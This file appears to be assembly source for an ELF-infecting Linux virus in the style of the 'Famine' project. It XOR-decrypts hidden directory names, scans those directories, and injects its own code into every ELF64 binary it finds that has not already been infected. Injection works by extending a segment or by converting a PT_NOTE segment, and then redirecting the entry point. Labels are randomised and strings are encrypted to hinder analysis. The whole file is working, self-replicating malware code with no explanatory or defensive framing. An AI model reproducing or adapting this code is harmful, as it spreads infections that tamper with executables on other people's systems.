; %include "famine.inc"
%include "obf_file.inc"

bits 64 
default rel

section .text
global _start

_start:
; placing famine on the stack
push rbp
mov rbp, rsp
PUSHA
lea rdi, [rel SHOZ0hUC7f]     ; dir to open for arg readDir
mov rsi, DuBdv
call toi1e2pbl9

lea rdi, [rel cxHH7INbR5]
mov rsi, Fe3Aok
call toi1e2pbl9
yDxlco:
POPA
mov rsp, rbp
pop rbp
Z8sBRtqv:
jmp v730rc5Yi

; take directory to open in rdi && size of pwd on rsi
toi1e2pbl9:
push rbp
mov rbp, rsp
push rax
push rsi
call Vqr307Sg
mov rdi, rax
pop rsi
pop rax
sub rsp, famine_size
push rsi
lea r8, FAM(famine.fd)
or qword [r8], -1
lea r8, FAM(famine.pwdPtr)
; mov r10, [rdi]
mov [r8], rdi
lea r8, FAM(famine.lenghtPwd)
mov [r8], rsi
mov rax, 2
mov rsi, 0x0000| O_DIRECTORY 
xor rdx, rdx
syscall
cmp rax, 0 
pop rsi        ; Get the string size back to unmap
jl oYxL6D
lea rdi, FAM(famine.fd)             ; enregistre le fd dans la struct
mov [rdi], rax

p30gnyZ2T:
lea r10, FAM(famine.fd)
mov rdi, [r10]
lea r9, FAM(famine.total_read)              ; init total_read
mov DWORD[r9], 0 
mov rax, 217; getdents64(int fd, void *buf, size_t size_buf) 
lea rsi, FAM(famine.dirents)
mov rdx, 0x1000
syscall
cmp rax, 0 
jle oYxL6D

lea r10, FAM(famine.dirents_struct_ptr)  ; r10 -> (struct famine.diretents_struct_ptr)
mov [r10], rsi                           ; famine.dirents_struct_ptr -> famine.dirents
lea r11, FAM(famine.total_to_read)       ; r11 -> (struct famine.total_to_read)
mov DWORD [r11], eax ; famine.total_to_read = getdents total length 

UZnG4v:
lea r8, FAM(famine.total_read)        ; r8 -> total lu de getdents
lea r9, FAM(famine.total_to_read)        ; r9 -> total a lire de getdents
mov r10, FAM(famine.dirents_struct_ptr)  ; r10 -> actual dirent struct
lea r11, FAM(famine.dirents_struct_ptr)  ; r11 -> ptr de la struct actuelle
movzx r12, WORD [r10 + D_RECLEN_OFF] ; r12 = length de la stuct dirents actuelle 
add [r8], r12d                          ; update du total lu dans r8
add [r11], r12                           ; famine.diretns_struct_ptr -> sur la prochaine struct
cmp BYTE [r10 + D_TYPE], 0x8; verifie le type du fichier 
jne VmTvv6yf1

cmO3AkE:
lea rsi, [r10 + D_NAME] ; charge le nom du fichier dans rsi 
mov byte [rsi - 1], '/'
sub rsi, FAM(famine.lenghtPwd)
mov rdi, FAM(famine.pwdPtr)
call a8XWhYLE9P

CZQ7L:
call tkBxGw

VmTvv6yf1:
mov r8, FAM(famine.total_read)
mov r12, FAM(famine.total_to_read)
cmp r8d, r12d                   ; if (total lu >= total getdents)
mov rdi, FAM(famine.pwdPtr)
mov rsi, FAM(famine.lenghtPwd)
jge p30gnyZ2T
jmp UZnG4v

tkBxGw:
push rbp
mov rbp, rsp
sub rsp, infection_size
lea rax, INF(infection.injection_offset)
mov qword [rax], 0 
lea rax, INF(infection.add_page)
mov byte [rax], 0 
lea rax, INF(infection.mem_eof)
mov qword [rax], 0 

wKCWvn7:
mov rax, 2
mov rdi, rsi
mov rsi, 0x0002
xor rdx, rdx
syscall
cmp rax, 0x0 
jl FDzv4z4iHP
mov INF(infection.file_fd), rax

; === get file size ===
QZa6UvGax:
mov rax, 8
mov rdi, INF(infection.file_fd)
mov rsi, 0x0 
mov rdx, 0x2
syscall
cmp rax, 0x0 
jle utWmioXb6
mov INF(infection.map_size), rax
mov INF(infection.original_end), rax

s3mLo:
; rax -> map
mov rsi, rax        ; rsi = file_size
mov rax, 9
mov rdi, 0x0 
mov rdx, 2| 4| 1
mov r10, 1
mov r8, INF(infection.file_fd)
mov r9, 0x0 
syscall
cmp rax, 0x0 ; rax -> map (used later) 
jl utWmioXb6
lea r8, INF(infection.map_addr)
mov [r8], rax

XwR54B2yc:
cmp dword [rax + 1], 0x02464c45 ; if != 'ELF64' 
jne yz6ei

bOE9H:
; rax == total segment number
; r9 == injection offset
; r13 == original segment end offset
; r14 -> header table
; r15 -> map
mov r15, rax
mov r14, r15
add r14, [r14 + elf64_ehdr.e_phoff]
xor rcx, rcx
nuyr0kVFP:
cmp cx, [r15  + elf64_ehdr.e_phnum]
jge DSAm6yw 
add r14, elf64_phdr_size
inc rcx
jmp nuyr0kVFP
DSAm6yw:
mov INF(infection.last_seg_hdr_addr), r14
xor r9, r9
MmLAdP:
cmp cx, 0 
jle edqPU
i510lU:
bt word [r14], 0 ; is segment header's first bit != 0 
jnc qEPfzBu
bt qword [r14], 0x20 ; is segment header's 33rd bit == 1 
jc dwHn6D
qEPfzBu:
dec rcx
sub r14, elf64_phdr_size
jmp MmLAdP

edqPU:
mov r9, INF(infection.injection_offset)
cmp r9, 0 
je yz6ei
cmp byte INF(infection.add_page), 1 ; if new page needed jump _add page 
je PlP0KzX
jmp gUWm3          ; else jmp gUWm3

dwHn6D:
; Check if the segment signed, else check the size, if big enough save the offsets if not already done
yTENMBmuK:
; r8 -> potential iH2O9FAJE
; r9 == iH2O9FAJE variable
mov r8, r15
add r8, [r14 + elf64_phdr.p_offset]
add r8, [r14 + elf64_phdr.p_filesz]
sub r8, mloz46FK
mov r9, [rel iH2O9FAJE]
mov rdi, r9
mov r8, mloz46FK
mov rsi, r8
push rax
call Vqr307Sg
mov r9, rax
pop rax
cmp qword r9, [r8]
je yz6ei
mov rdi, r9
mov rsi, mloz46FK
call V8y9nRnm

vy0fTO2v:
mov r9, INF(infection.injection_offset)
test r9, r9
jz xM84XlhY
mov r9, INF(infection.add_page)
test r9, r9
jz qEPfzBu

xM84XlhY:
; r8 == end of infection offset
; r9 == next segment offset
mov r8, [r14 + elf64_phdr.p_offset]
add r8, [r14 + elf64_phdr.p_filesz]
mov r13, r8        ; save segment end's offset
add r8, CODE_LEN 
mov r9, r14
add r9, elf64_phdr_size
add r9, elf64_phdr.p_offset
cmp [r9], r8
setb INF(infection.add_page)   ; if ([r9] < r8) { infection.add_page = 1) }

VZLEdjx:
; r8 -> infection structure members
; r9 == injection address
; r12 == original entrypoint
;*r13 == segment end's offset (xM84XlhY)
;*r14 -> segment header in header table
lea r8, INF(infection.seg_nb)
mov [r8], cl
lea r8, INF(infection.original_entry)
mov r12, [r15 + elf64_ehdr.e_entry]
mov [r8], r12
lea r8, INF(infection.injection_offset)
mov [r8], r13
lea r8, INF(infection.injection_addr)
push r9
mov r9, [r14 + elf64_phdr.p_vaddr]
add r9, [r14 + elf64_phdr.p_memsz]
mov [r8], r9
pop r9
lea r8, INF(infection.seg_hdr_addr)
mov [r8], r14
jmp qEPfzBu

PlP0KzX:
nLLiYnM4DO:
mov rax, 77
mov rdi, INF(infection.file_fd)
lea rsi, INF(infection.map_size)
push qword [rsi]
add qword [rsi], 0x1000
and qword [rsi], -4096
add qword [rsi], CODE_LEN 
mov rsi, [rsi]
syscall
pop rsi
cmp rax, 0 
jl yz6ei

bfZpXJJcq:
mov rdi, INF(infection.map_addr)
mov rax, 11
syscall

omnpqVvBzq:
mov rax, 9
mov rdi, 0x0 
mov rsi, INF(infection.map_size)    ; rsi = file_size
mov rdx, 2| 4| 1
mov r10, 1
mov r8, INF(infection.file_fd)
mov r9, 0x0 
syscall
cmp rax, 0x0 ; rax -> map (used later) 
jl utWmioXb6
lea r8, INF(infection.map_addr)
mov [r8], rax

pwdck02R0:
mov r14, INF(infection.map_addr)
movzx rax, word [r14 + elf64_ehdr.e_shnum]
add r14, [r14 + elf64_ehdr.e_shoff]
xor rcx, rcx

eBxxoar:
cmp rcx, rax
jge HjHPAITTO
mov rbx, [r14 + elf64_shdr.sh_addr]
add rbx, [r14 + elf64_shdr.sh_size]
cmp INF(infection.mem_eof), rbx
jge OfR3CI
mov INF(infection.mem_eof), rbx

OfR3CI:
add r14, elf64_shdr_size
inc rcx
jmp eBxxoar

HjHPAITTO:

M6foUJX2fu:
; r14 -> segmentS header
; rcx == segment counter
mov r14, INF(infection.map_addr)
movzx rax, word [r14 + elf64_ehdr.e_phnum]
add r14, [r14 + elf64_ehdr.e_phoff]
xor rcx, rcx

PjiXZit:
cmp rcx, rax
jge AD6PwwODu
cmp dword [r14 + elf64_phdr.p_type], 0x4
je Ke6BlAsOI

rHhbXlqb:
add r14, elf64_phdr_size
inc rcx
jmp PjiXZit

AD6PwwODu:
mov r14, -1 ; detect if no note found. See Ke6BlAsOI line 1 

Ke6BlAsOI:
; r14 -> segment header
; rax == new offset / address
cmp r14, 0 
jl FclxH5zB0e
mov dword [r14 + elf64_phdr.p_type], 0x1
mov qword [r14 + elf64_phdr.p_flags], 0x1| 0x4
mov qword [r14 + elf64_phdr.p_filesz], CODE_LEN 
mov qword [r14 + elf64_phdr.p_memsz], CODE_LEN 
mov qword [r14 + elf64_phdr.p_align], 0x1000 
mov rax, INF(infection.original_end)
add rax, 0x1000 
and rax, -4096
mov qword [r14 + elf64_phdr.p_offset], rax
mov qword INF(infection.injection_offset), rax
mov rax, INF(infection.mem_eof)
add rax, 0x1000 
and rax, -4096
mov qword INF(infection.injection_addr), rax
mov qword [r14 + elf64_phdr.p_vaddr], rax
mov qword [r14 + elf64_phdr.p_paddr], rax

gUWm3:
gAgB8QJzv:
; r8 -> elf header entrypoint
; r9 == end of segment + align (injection offset)
; r10 == injection offset
mov r8, INF(infection.map_addr)
add r8, elf64_ehdr.e_entry
mov r10, INF(infection.injection_addr)
mov [r8], r10
cmp byte INF(infection.add_page), 0 
jg WNZJ15dAe
mov rdi, CODE_LEN 
call xtWZw

WNZJ15dAe:
; rdi -> injection start
; rsi -> parasite _start
; rcx == code len (w1pILrlan - _start)
mov rdi, INF(infection.map_addr)
add rdi, INF(infection.injection_offset)
lea rsi, [rel _start]     ; rsi -> start of our code
mov rcx, CODE_LEN ; counter will decrement 
cld          ; copy from _start to w1pILrlan (= !std)
rep movsb

FclxH5zB0e:
; r8 -> Z8sBRtqv instruction's addr (Z8sBRtqv + 1)
; r9 == distance to jump from final jump to original entry point
mov r8, INF(infection.map_addr)
add r8, INF(infection.injection_offset)
add r8, FINJMP_OFF 
inc r8
mov r10, INF(infection.injection_addr)
add r10, FINJMP_OFF 
add r10, 0x05 
mov r9, INF(infection.original_entry)
sub r9, r10
mov [r8], r9d
jmp yz6ei

xtWZw:
; r8 -> segment header data
;*r14 -> segment header in header table

mov r8, INF(infection.seg_hdr_addr)
push r8           ; save header start for later

; * Update file size *
add r8, qword elf64_phdr.p_filesz
add qword [r8], rdi
pop r8

; * Update memory size *
add r8, elf64_phdr.p_memsz
add qword [r8], rdi

ret

yz6ei:
lea rdi, INF(infection.map_addr)
lea rsi, INF(infection.map_size)
call V8y9nRnm
jmp utWmioXb6

V8y9nRnm:
mov rax, 11
syscall
ret

utWmioXb6:
mov rax, 3
mov rdi, INF(infection.file_fd)
syscall
mov qword INF(infection.file_fd), -1
jmp FDzv4z4iHP

oYxL6D:
mov rdi, FAM(famine.fd)
cmp rdi, 0 
jle FDzv4z4iHP
mov rax, 3
syscall
mov rdi, FAM(famine.pwdPtr)
mov rsi, FAM(famine.lenghtPwd)
call V8y9nRnm
or qword FAM(famine.fd), -1
jmp FDzv4z4iHP

FDzv4z4iHP:
leave
ret

v730rc5Yi:
mov rax, 60 
xor rdi, rdi
syscall

;strcpy(dst:rsi src: rdi) (without /0 at the end)
a8XWhYLE9P:
xor rcx, rcx
xs5b2:
cmp byte [rdi + rcx], 0 
je uine0
mov al, byte [rdi + rcx]
mov [rsi + rcx], al
add rcx, 1 
jmp xs5b2

uine0:
; mov byte [rsi + rcx], 0 
ret

; rax: char *_decrypt_str(rsi: char *to_decrypt, rdi: len)
Vqr307Sg:
; rax == div quotient
; rbx -> to_decrypt
; rcx == counter
; rdx == div modulo
; r9 == len uxRoEFaM
; r10 -> key_char
; r11 -> decrypted str (mmap)
; r12 == len to_decrypt
; rsi -> uxRoEFaM
push rbx
push rcx
push rdx
push r8
push r9
push r10
push r11
push r12
mov rbx, rdi
mov r12, rsi
xor rdi, rdi ; addr = NULL (let kernel choose) 
mov rdx, 0x03 ; 2| 4= 1 | 2 = 3 
mov r10, 0x22 ; MAP_PRIVATE | MAP_ANONYMOUS = 0x2 | 0x20 = 0x22 
mov r8, -1                      ; fd = -1
xor r9, r9 ; offset = 0 
mov rax, 9 ; syscall number for mmap 
syscall
cmp rax, 0 
jl kxTsz
mov r11, rax
lea rsi, uxRoEFaM
call n5XJlD2HbO
mov r9, rax
xor rcx, rcx
xor rdx, rdx
Ce1z65:
cmp rcx, r12
jge kxTsz
mov rax, rcx
xor rdx, rdx
cmp rcx, 0 
jne Q6WTbJO
xor rax, rax
jmp UkR8uvmBD6
Q6WTbJO:
div r9
UkR8uvmBD6:
movzx r10, byte [rsi + rdx] ; r10 == key[rcx % key_len]
xor r10b, [rbx + rcx]
mov [r11 + rcx], r10b
inc rcx
jmp Ce1z65
kxTsz:
mov rax, r11
pop r12
pop r11
pop r10
pop r9
pop r8
pop rdx
pop rcx
pop rbx
ret

; debug
; strlen(str:rsi)
n5XJlD2HbO:
xor rcx, rcx

URY6wpC:
cmp byte [rsi + rcx], 0 
je tYFng1R
inc rcx
jmp URY6wpC

tYFng1R:
mov rax, rcx
ret


SHOZ0hUC7f db 0x44, 0x14, 0x03, 0x27, 0x6E, 0x1A, 0x3C, 0x00, 0x26, 0x43 
DuBdv    equ $ - SHOZ0hUC7f
cxHH7INbR5 db 0x4B, 0x27, 0x57, 0x56, 0x04, 0x24, 0x4A, 0x1A, 0x33, 0x70, 0x7D 
Fe3Aok    equ $ - cxHH7INbR5
uxRoEFaM db 0x32, 0x26, 0x55, 0x52, 0x42, 0x30, 0x23, 0x4B, 0x46, 0x5F, 0x3D, 0x5F 
PWD5SG0 db 0x44, 0x22, 0x22, 0x22, 0x22, 0x00 
iH2O9FAJE db 0x1A, 0x3B, 0x0D, 0x3C, 0x46, 0x0E, 0x17, 0x03, 0x42, 0x37, 0x52, 0x03, 0x33, 0x34, 0x40, 0x64, 0x06, 0x5B, 0x17, 0x5D, 0x44, 0x6C, 0x4E, 0x0E, 0x39, 0x3E, 0x40, 0x37, 0x51, 0x4B, 0x56, 0x1B, 0x51, 0x2C, 0x4F, 0x09, 0x39, 0x34, 0x4D, 0x30, 0x4D, 0x0F, 0x4E, 0x75 
mloz46FK equ $ - iH2O9FAJE
w1pILrlan: 